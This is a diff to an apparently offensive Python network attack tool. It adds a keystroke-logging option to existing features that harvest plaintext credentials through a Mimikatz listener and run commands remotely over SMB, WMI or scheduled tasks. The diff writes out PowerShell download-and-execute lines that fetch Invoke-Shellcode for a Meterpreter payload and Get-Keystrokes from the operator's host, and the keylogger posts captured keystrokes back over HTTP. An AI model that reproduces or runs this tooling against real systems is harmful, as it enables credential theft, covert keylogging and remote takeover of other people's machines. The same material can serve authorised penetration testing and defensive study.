@@ -222,13 +222,14 @@ class MimikatzServer(BaseHTTPRequestHandler):
                     print_succ('{} Found plain text creds! Domain: {} Username: {} Password: {}'.format(self.client_address[0], yellow(domain), yellow(user), yellow(passw)))
                 i += 1
 
-        elif args.mimi_cmd:
+        elif args.mimi_cmd or args.get_keystrokes:
             print data
 
-        log_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
-        with open('logs/' + log_name, 'w') as creds:
-            creds.write(data)
-        print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(log_name)))
+        if not args.get_keystrokes:
+            log_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
+            with open('logs/' + log_name, 'w') as creds:
+                creds.write(data)
+            print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(log_name)))
 
 class SMBServer(Thread):
     def __init__(self):
@@ -2714,7 +2715,7 @@ def ps_command(command=None, katz_ip=None, katz_command='privilege::debug sekurl
 
 def inject_pscommand(localip):
 
-    if args.inject.startswith('met_'):
+    if args.inject and args.inject.startswith('met_'):
         command = """
         IEX (New-Object Net.WebClient).DownloadString('http://{}/Invoke-Shellcode.ps1');
         Invoke-Shellcode -Force -Payload windows/meterpreter/{} -Lhost {} -Lport {}""".format(localip,
@@ -2750,6 +2751,11 @@ def inject_pscommand(localip):
             command += " -ExeArgs \"{}\"".format(args.exeargs)
 
         command += ';'
+
+    elif args.get_keystrokes:
+        command = """
+        IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Get-Keystrokes.ps1');
+        Get-Keystrokes -HttpUrl http://{addr};""".format(addr=localip)
 
     return ps_command(command)
 
@@ -2933,7 +2939,7 @@ def connect(host):
             if args.pscommand:
                 args.command = ps_command(command=args.pscommand)
 
-            if args.inject:
+            if args.inject or args.get_keystrokes:
                 noOutput = True
                 args.command = inject_pscommand(local_ip)
 
@@ -3057,9 +3063,10 @@ if __name__ == '__main__':
     sgroup.add_argument("--patternfile", type=str, help='File containing patterns to search for in folders, filenames and file content (if enabled)')
     sgroup.add_argument("--depth", type=int, default=10, help='Spider recursion depth (default: 10)')
 
-    cgroup = parser.add_argument_group("Command Execution", "Options for executing commands")
+    cgroup = parser.add_argument_group("Command/Code Execution", "Options for executing commands/code")
     cgroup.add_argument('--execm', choices={"wmi", "smbexec", "atexec"}, default="smbexec", help="Method to execute the command (default: smbexec)")
     cgroup.add_argument('--force-ps32', action='store_true', dest='force_ps32', help='Force all PowerShell code/commands to run in a 32bit process')
+    cgroup.add_argument('--keystrokes', action='store_true', dest='get_keystrokes', help='Inject Get-Keystrokes')
     cgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute the specified command")
     cgroup.add_argument("-X", metavar="PS_COMMAND", dest='pscommand', help='Excute the specified powershell command')
 
@@ -3153,7 +3160,7 @@ if __name__ == '__main__':
             print_error('Unable to find combo file at specified path')
             sys.exit(1)
 
-    if args.mimikatz or args.mimi_cmd or args.inject or (args.ntds == 'ninja'):
+    if args.mimikatz or args.mimi_cmd or args.inject or args.get_keystrokes or (args.ntds == 'ninja'):
         print_status("Press CTRL-C at any time to exit")
         print_status('Note: This might take some time on large networks! Go grab a redbull!\n')
 
@@ -3164,7 +3171,7 @@ if __name__ == '__main__':
 
     concurrency(hosts)
 
-    if args.mimikatz or args.inject or args.ntds == 'ninja':
+    if args.mimikatz or args.inject or args.get_keystrokes or args.ntds == 'ninja':
         try:
             while True:
                 sleep(1)
